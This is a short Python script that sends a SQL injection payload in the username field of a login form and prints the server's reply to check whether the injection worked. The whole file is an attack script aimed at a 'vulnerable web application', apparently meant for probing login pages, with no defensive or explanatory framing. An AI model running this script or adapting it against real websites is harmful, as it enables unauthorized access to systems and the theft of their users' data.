import requests

# URL of the vulnerable web application
url = "http://example.com/login.php"

# Payload for SQL injection attack
payload = "admin' AND 1=CAST((SELECT 1/0) AS INT)--"

# Data to be sent in the POST request
data = {
    'username': payload,
    'password': 'password',  # This can be any value since it won't be used in this attack
}

# Send POST request with payload
response = requests.post(url, data=data)

# Check the response for error messages or any indication of successful injection
print(response.text)
